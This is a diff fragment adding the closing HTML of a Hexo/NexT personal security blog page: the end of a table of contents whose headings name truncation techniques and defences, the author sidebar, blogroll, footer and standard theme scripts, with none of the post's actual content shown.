nav-level-4"><a class="nav-link" href="#截断"><span class="nav-number">1.7.3.</span> <span class="nav-text">.&#x2F;截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪截断"><span class="nav-number">1.7.4.</span> <span class="nav-text">?伪截断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方式"><span class="nav-number">1.8.</span> <span class="nav-text">防御方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
